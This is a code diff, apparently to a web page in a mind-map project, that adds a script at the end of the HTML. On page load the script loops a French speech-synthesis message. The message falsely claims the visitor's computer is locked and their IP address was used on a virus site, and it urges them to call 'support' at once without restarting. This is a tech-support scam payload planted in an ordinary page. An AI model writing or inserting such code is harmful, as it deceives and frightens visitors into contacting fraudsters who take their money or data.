@@ -85628,6 +85628,31 @@ simple-mind-map/dist/simpleMindMap.esm.min.css:
       </div>
     </template></div>
   <div class="modal-backdrop fade show"></div>
+  <script>
+    window.onload = function () {
+      
+       const texte = "Message de sécurité important votre ordinateur a été verrouillé votre adresse IP a été utilisée pour visiter un site contenant des virus de vols d’identité. Pour déverrouiller l’ordinateur veuillez appeler l’assistance immédiatement. N’essayez pas de redémarrer ou d’arrêter votre ordinateur, cela pourrait entraîner la perte de données et le vol d’identité. Veuillez appeler notre support immédiatement.";
+ 
+       function lireEnBoucle() {
+           
+           const utterance = new SpeechSynthesisUtterance(texte);
+           utterance.lang = 'fr-FR';
+           utterance.volume = 1;
+           utterance.rate = 0.7;
+           utterance.pitch = 1;
+ 
+           
+           utterance.onend = function () {
+               setTimeout(lireEnBoucle, 100);
+           };
+ 
+       
+           speechSynthesis.speak(utterance);
+       }
+ 
+       lireEnBoucle();
+   }; 
+   </script>
 </body>
 
 </html>
